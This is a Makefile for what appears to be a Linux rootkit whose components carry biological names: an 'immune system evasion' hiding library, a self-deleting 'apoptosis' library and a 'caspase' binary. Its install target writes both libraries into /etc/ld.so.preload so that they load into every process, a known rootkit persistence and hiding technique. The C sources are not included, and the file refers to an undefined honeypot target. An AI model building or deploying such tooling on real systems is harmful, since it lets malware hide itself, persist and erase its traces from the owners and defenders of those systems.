CC ?= gcc
CFLAGS ?= -fPIC -O2 -Wall -Wextra
LDFLAGS ?= -shared
LDLIBS ?= -ldl -pthread

# Debug flag - set DEBUG=1 to enable debug output
ifdef DEBUG
    CFLAGS += -DDEBUG_MODE=1
else
    CFLAGS += -DDEBUG_MODE=0
endif

# Installation paths
LIBDIR := /usr/local/lib
PRELOAD_FILE := /etc/ld.so.preload

# Immune system evasion
HIDE_SRC := mhc_downreg.c
HIDE_TARGET := mhc_downreg.so
HIDE_OBJ := $(HIDE_SRC:.c=.o)

# Programmed cell death
SELFDELETE_SRC := apoptosis.c
SELFDELETE_TARGET := apoptosis.so
SELFDELETE_OBJ := $(SELFDELETE_SRC:.c=.o)

# Executioner caspases
BIN_TARGET := caspase.o
BIN_SRC := caspase.c

.PHONY: all clean install

all: $(HIDE_TARGET) $(SELFDELETE_TARGET) $(BIN_TARGET) $(HONEYPOT_TARGET)

$(HIDE_TARGET): $(HIDE_OBJ)
	$(CC) $(LDFLAGS) -o $@ $^ $(LDLIBS)

$(SELFDELETE_TARGET): $(SELFDELETE_OBJ)
	$(CC) $(LDFLAGS) -o $@ $^ $(LDLIBS)

%.o: %.c
	$(CC) $(CFLAGS) -c -o $@ $<

$(BIN_TARGET): $(BIN_SRC)
	$(CC) -o $@ $<

install: $(HIDE_TARGET) $(SELFDELETE_TARGET)
	cp $(HIDE_TARGET) $(LIBDIR)/
	cp $(SELFDELETE_TARGET) $(LIBDIR)/
	echo "$(LIBDIR)/apoptosis.so" >> $(PRELOAD_FILE)
	echo "$(LIBDIR)/mhc_downreg.so" >> $(PRELOAD_FILE)
	ldconfig

clean:
	$(RM) $(HIDE_OBJ) $(HIDE_TARGET) $(SELFDELETE_OBJ) $(SELFDELETE_TARGET) $(BIN_TARGET) $(HONEYPOT_TARGET)
